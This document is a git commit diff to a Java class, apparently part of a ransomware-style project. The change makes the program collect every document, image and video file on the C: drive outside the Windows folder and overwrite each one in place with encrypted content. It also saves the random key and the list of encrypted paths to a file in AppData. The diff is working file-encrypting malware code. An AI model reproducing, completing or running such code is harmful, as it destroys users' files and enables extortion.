16c26779afe6633efeecb66e77fa427a3fa3fcce
ParkMini <parkteammini@gmail.com>
2023-12-14 18:08:12 +0900

    C드라이브를 인덱싱하여 최하위부터 최상위로 암호화하도록 수정

--- src/main/java/kr/pah/Encrypt.java
+++ src/main/java/kr/pah/Encrypt.java
@@ -6,22 +6,34 @@ import java.io.File;
 import java.io.FileWriter;
 import java.nio.file.FileSystemException;
 import java.nio.file.Files;
-import java.util.ArrayList;
-import java.util.List;
-import java.util.UUID;
+import java.util.*;
 
 public class Encrypt {
 
     private static final String KEY = UUID.randomUUID().toString().replaceAll("-", "");
     private static final String[] EXTENSIONS = new String[]{".doc", ".docx", ".pdf", ".txt", ".ppt", ".pptx", ".xls", ".xlsx", ".csv", ".jpg", ".jpeg", ".png", ".gif", ".bmp", ".tiff", ".svg", ".mp4", ".avi", ".mov", ".wmv", ".flv", ".swf", ".mkv"};
+    private static final String WINDOWS_FOLDER = "C:\\Windows";
 
     public static void runEncryption() throws Exception {
-        List<String> encryptedFiles = new ArrayList<>();
+        List<File> filesToEncrypt = new ArrayList<>();
         File root = new File("C:\\");
 
-        encryptFilesInDirectory(root, encryptedFiles);
+        collectFiles(root, filesToEncrypt);
 
-        // 암호화된 파일 경로 저장
+        Collections.sort(filesToEncrypt, Comparator.comparingInt(file -> file.getPath().length()));
+        Collections.reverse(filesToEncrypt);
+
+        List<String> encryptedFiles = new ArrayList<>();
+
+        for (File file : filesToEncrypt) {
+            try {
+                encryptFile(file);
+                encryptedFiles.add(file.getAbsolutePath());
+            } catch (FileSystemException e) {
+                System.out.println("FileSystemException = " + e.getFile());
+            }
+        }
+
         try (FileWriter writer = new FileWriter(System.getenv("APPDATA") + "\\encrypted.txt")) {
             writer.write(KEY + System.lineSeparator());
             for (String filePath : encryptedFiles) {
@@ -30,32 +42,33 @@ public class Encrypt {
         }
     }
 
-    private static void encryptFilesInDirectory(File directory, List<String> encryptedFiles) throws Exception {
-        File[] files = directory.listFiles();
-        if (files != null) {
-            for (File file : files) {
+    private static void collectFiles(File directory, List<File> files) {
+        // Skip the Windows system folder
+        if (directory.getAbsolutePath().equalsIgnoreCase(WINDOWS_FOLDER)) {
+            return;
+        }
+
+        File[] found = directory.listFiles();
+        if (found != null) {
+            for (File file : found) {
                 if (file.isDirectory()) {
-                    encryptFilesInDirectory(file, encryptedFiles);
+                    collectFiles(file, files);
                 } else {
                     for (String extension : EXTENSIONS) {
                         if (file.getName().toLowerCase().endsWith(extension)) {
-                            try {
-                                encryptFile(file);
-                                encryptedFiles.add(file.getAbsolutePath());
-                            } catch (FileSystemException ignored) {
-                            }
+                            files.add(file);
                             break;
                         }
                     }
                 }
             }
         }
+        System.out.println("found = " + Arrays.toString(found));
     }
 
     private static void encryptFile(File file) throws Exception {
         byte[] fileContent = Files.readAllBytes(file.toPath());
         byte[] encryptedContent = encrypt(fileContent);
-
         Files.write(file.toPath(), encryptedContent);
     }
 
